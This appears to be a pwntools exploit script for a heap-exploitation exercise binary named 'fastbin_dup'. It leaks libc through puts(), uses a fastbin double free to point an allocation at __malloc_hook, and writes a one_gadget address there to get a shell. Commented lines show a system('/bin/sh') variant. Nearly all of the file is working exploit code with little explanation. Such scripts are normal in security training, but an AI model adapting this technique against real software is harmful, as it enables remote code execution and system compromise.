#!/usr/bin/python3
from pwn import *

elf = context.binary = ELF("fastbin_dup")
libc = ELF(elf.runpath + b"/libc.so.6") # elf.libc broke again

gs = '''
continue
'''
def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    else:
        return process(elf.path)

# Index of allocated chunks.
index = 0

# Select the "malloc" option; send size & data.
# Returns chunk index.
def malloc(size, data):
    global index
    io.send(b"1")
    io.sendafter(b"size: ", f"{size}".encode())
    io.sendafter(b"data: ", data)
    io.recvuntil(b"> ")
    index += 1
    return index - 1

# Select the "free" option; send index.
def free(index):
    io.send(b"2")
    io.sendafter(b"index: ", f"{index}".encode())
    io.recvuntil(b"> ")

io = start()

# This binary leaks the address of puts(), use it to resolve the libc load address.
io.recvuntil(b"puts() @ ")
libc.address = int(io.recvline(), 16) - libc.sym.puts
io.timeout = 0.1

# =============================================================================

# =-=-=- EXAMPLE -=-=-=

# Set the username field.
username = b"ferity-fan"
io.sendafter(b"username: ", username)
io.recvuntil(b"> ")

# Request two 0x30-sized chunks and fill them with data.
chunk_A = malloc(0x68, b"A"*0x28)
chunk_B = malloc(0x68, b"B"*0x28)

# Free the first chunk, then the second.
free(chunk_A)
free(chunk_B)
free(chunk_A)

# modify fd
malloc(0x68, p64(libc.sym.__malloc_hook - 35))

# malloc twice
malloc(0x68, b'0')
malloc(0x68, b'1')

# malloc fake chunk
# if no limit malloc's count
# malloc(0x68, p8(0)*0x13+p64(libc.sym.system))
# sh_addr = p64(next(libc.search(b'/bin/sh\x00')))

# malloc(sh_addr, b"")
one = [0xc4dbf, 0xc4de6, 0xe1fa1]
malloc(0x68, p8(0)*0x13+p64(libc.address + one[2]))
malloc(0x10, b'')


# =============================================================================

io.interactive()
